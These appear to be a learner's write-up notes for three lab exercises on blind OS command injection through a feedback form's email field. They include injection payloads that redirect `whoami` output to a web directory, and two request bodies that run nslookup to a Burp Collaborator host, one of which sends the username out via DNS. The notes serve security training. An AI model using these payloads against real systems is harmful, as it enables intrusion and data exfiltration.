# Lab: Blind OS command injection with output redirection
goal : To solve the lab, execute the `whoami` command and retrieve the output. 

Approach : 
- so  first i dont know what  to do so i visit some endpoints then try to go for a filename from image but not getting anything.
- then got a hint from solution that we have to add text file first though command like  a /var/www/images directory 
- we have to add this payload `||whoami>/var/www/images/output.txt||` in the email field then go to filename= parameter and search for the output.txt file. 
---

# Lab: Blind OS command injection with out-of-band interaction
Goal : This lab contains a blind OS command injection vulnerability in the feedback function.
To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.


```
csrf=8aT8qsgmGVhbSGfVvoI4QWbz3z6rioCb&name=test&email=x||nslookup+x.8x6eq7oh5ifr135q5mz5g29gg7myaoyd.oastify.com||&subject=ad&message=ad%0A%0Anslookup+test%408x6eq7oh5ifr135q5mz5g29gg7myaoyd.oastify.com
```

---
# Lab: Blind OS command injection with out-of-band data exfiltration
Goal: his lab contains a blind OS command injection vulnerability in the feedback function.
To solve the lab, execute the `whoami` command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.

```
csrf=9kp1zwY4275B1tGM4zUimfH1tKgjr8sB&name=test&email=||nslookup+`whoami`.7jrdc6agrh1qn2rprll421vf268ywokd.oastify.com||&subject=d&message=asds
```

